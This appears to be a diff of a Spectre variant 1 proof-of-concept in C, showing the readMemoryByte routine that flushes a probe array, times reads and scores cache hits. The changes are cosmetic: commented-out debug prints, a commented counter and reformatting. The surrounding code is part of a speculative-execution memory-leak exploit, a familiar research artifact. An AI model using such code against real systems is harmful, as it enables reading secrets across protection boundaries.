@@ -54,6 +54,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
 
   // 1k trials
   // 1 trial is 30 probes
+  //printf("NEWNEWNEW\n");
+  //int bklcount = 0;
   for (tries = 999; tries > 0; tries--) {
     /* Flush probeArray[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
@@ -87,7 +89,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
     //By this time the cache should have been speculatively filled in
     // even if we were out of bounds
     // ************************************************************
-    
+
     /* Time reads. Mixed-up order to prevent stride prediction */
     // read everything in the probeArray (size 256 * 512)
     //printf("newset\n");
@@ -107,6 +109,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
       // mix_i [0,256) != array1[ [0,999) mod 16 ]
       // ^ what does this mean? The 
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+        //      bklcount++;
         results[mix_i]++; /* cache hit -> score +1 for this value */
     }
 
@@ -122,16 +125,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
       }
     }
 
-    if (results[j] >= (2 * results[k] + 5) ||
-        (results[j] == 2 && results[k] == 0))
+    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
       break; /* Success if best is > 2*runner-up + 5 or 2/0) */
   }
 
   // whats in results? should be results of 1000 trials
-//  printf("Trial Results:\n");
-//  for (i = 0; i < 256; i++) {
-//    printf("res %c: %d\n",i,results[i]);
-//  }
+  //  printf("Trial Results:\n");
+  //  for (i = 0; i < 256; i++) {
+  //    printf("res %c: %d\n",i,results[i]);
+  //  }
+  //printf("%d\n",bklcount);
 
   /* use junk to prevent code from being optimized out */
   results[0] ^= junk;
